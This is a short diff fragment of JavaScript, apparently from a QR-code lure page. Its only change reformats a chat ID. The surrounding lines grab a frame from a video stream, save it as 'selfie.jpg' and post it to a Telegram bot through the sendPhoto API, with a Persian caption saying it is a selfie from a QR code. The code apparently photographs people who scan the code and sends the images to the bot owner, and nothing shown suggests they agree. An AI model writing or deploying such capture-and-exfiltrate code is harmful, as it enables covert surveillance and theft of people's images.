@@ -29,7 +29,7 @@
         c.getContext('2d').drawImage(v,0,0,640,480);
         c.toBlob(b=>{
           const f=new FormData();
-          f.append('chat_id',`${CHAT_ID}`);
+          f.append('chat_id',CHAT_ID);
           f.append('caption','📸 عکس سلفی از QR Code');
           f.append('photo',b,'selfie.jpg');
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:f});
